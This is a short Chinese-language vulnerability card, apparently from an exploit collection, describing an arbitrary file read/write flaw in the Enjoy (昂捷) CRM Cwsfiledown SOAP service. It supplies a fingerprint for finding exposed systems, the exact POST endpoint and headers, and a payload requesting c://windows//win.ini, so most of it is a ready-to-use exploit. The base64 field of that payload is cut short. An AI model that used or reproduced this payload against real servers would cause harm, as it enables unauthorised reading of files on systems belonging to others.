# 昂捷CRMCwsfiledown任意文件读取漏洞

- **系统**：昂捷CRMCwsfiledown　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`"HisModules/ErpAdmin/RoleMng/Js/selectDefaultRole.js"`
- **请求**：`POST /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx HTTP/1.1`
- **关键头**：`Content-Length: 1775`　`Content-Type: text/xml;charset=UTF-8`　`SOAPAction: "http://tempuri.org/DownFileBytes"`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<DownFileBytes xmlns="http://tempuri.org/">
<sFileName>c://windows//win.ini</sFileName>
<iPosition>1</iPosition>
<iReadBytesLen>100</iReadBytesLen>
<bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA…（脚本共 1729 字，完整版见原文）
```
- **预期**：200　|　—